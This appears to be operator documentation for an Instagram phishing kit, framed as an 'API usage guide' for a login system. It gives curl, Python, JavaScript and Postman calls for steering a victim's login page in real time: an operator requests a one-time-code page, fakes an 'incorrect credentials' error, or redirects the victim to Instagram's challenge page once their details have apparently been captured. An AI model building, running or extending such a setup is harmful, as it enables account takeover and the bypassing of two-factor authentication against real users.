# API Usage Guide

## Overview

The login system now uses a session-based API that can be called from **anywhere** - any computer, any device, using any HTTP client.

## How It Works

1. **User clicks login** → Frontend creates a session and starts polling
2. **After 12 seconds** → Frontend waits for state change
3. **You call the API from anywhere** → Set the state (getOtp, incorrectCredentials, or success)
4. **Frontend detects change** → Updates the UI automatically

## API Endpoints

### Base URL
- Local: `http://localhost:3001`
- Production: Your Railway server URL (e.g., `https://your-app.railway.app`)

### 1. Create Session (Automatic)
**POST** `/api/create-session`

This is called automatically when user clicks login. You don't need to call this manually.

**Request:**
```json
{
  "username": "testuser"
}
```

**Response:**
```json
{
  "success": true,
  "sessionId": "session_1234567890_abc123",
  "message": "Session created successfully"
}
```

### 2. Get Current State
**GET** `/api/get-state/:sessionId`

Frontend polls this automatically. You can also check it manually.

**Response:**
```json
{
  "success": true,
  "state": "waiting",
  "username": "testuser",
  "message": "Current state: waiting"
}
```

**States:**
- `waiting` - Initial state, waiting for command
- `getOtp` - Show OTP page
- `incorrectCredentials` - Show error on login page
- `success` - Redirect to Instagram challenge

### 3. Set State (Call This From Anywhere!)
**POST** `/api/set-state`

**This is the main endpoint you'll use to control the login flow from anywhere.**

**Request:**
```json
{
  "sessionId": "session_1234567890_abc123",
  "command": "getOtp"
}
```

**Valid Commands:**
- `getOtp` - Shows the OTP verification page
- `incorrectCredentials` - Shows error message on login page
- `success` - Redirects to Instagram challenge URL

**Response:**
```json
{
  "success": true,
  "state": "getOtp",
  "message": "State updated to: getOtp"
}
```

## Examples

### Using cURL (Command Line)

```bash
# Set state to show OTP page
curl -X POST http://localhost:3001/api/set-state \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "session_1234567890_abc123",
    "command": "getOtp"
  }'

# Set state to show error
curl -X POST http://localhost:3001/api/set-state \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "session_1234567890_abc123",
    "command": "incorrectCredentials"
  }'

# Set state to redirect to success
curl -X POST http://localhost:3001/api/set-state \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "session_1234567890_abc123",
    "command": "success"
  }'
```

### Using Python

```python
import requests

API_URL = "http://localhost:3001"  # or your Railway URL
session_id = "session_1234567890_abc123"

# Show OTP page
response = requests.post(
    f"{API_URL}/api/set-state",
    json={
        "sessionId": session_id,
        "command": "getOtp"
    }
)
print(response.json())

# Show error
response = requests.post(
    f"{API_URL}/api/set-state",
    json={
        "sessionId": session_id,
        "command": "incorrectCredentials"
    }
)

# Redirect to success
response = requests.post(
    f"{API_URL}/api/set-state",
    json={
        "sessionId": session_id,
        "command": "success"
    }
)
```

### Using JavaScript/Node.js

```javascript
const API_URL = "http://localhost:3001"; // or your Railway URL
const sessionId = "session_1234567890_abc123";

// Show OTP page
fetch(`${API_URL}/api/set-state`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    sessionId: sessionId,
    command: "getOtp",
  }),
})
  .then((res) => res.json())
  .then((data) => console.log(data));

// Show error
fetch(`${API_URL}/api/set-state`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    sessionId: sessionId,
    command: "incorrectCredentials",
  }),
})
  .then((res) => res.json())
  .then((data) => console.log(data));

// Redirect to success
fetch(`${API_URL}/api/set-state`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    sessionId: sessionId,
    command: "success",
  }),
})
  .then((res) => res.json())
  .then((data) => console.log(data));
```

### Using Postman

1. Create a new POST request
2. URL: `http://localhost:3001/api/set-state`
3. Headers: `Content-Type: application/json`
4. Body (raw JSON):
```json
{
  "sessionId": "session_1234567890_abc123",
  "command": "getOtp"
}
```

## Getting the Session ID

When a user clicks login, the session ID is logged to the browser console. You can also check the server logs.

Alternatively, you can check all active sessions by looking at the server console output.

## Notes

- Sessions expire after 1 hour of inactivity
- The frontend polls the server every 2 seconds for state changes
- You can call the API from any device, any network, anywhere in the world
- Make sure your Railway server URL is publicly accessible
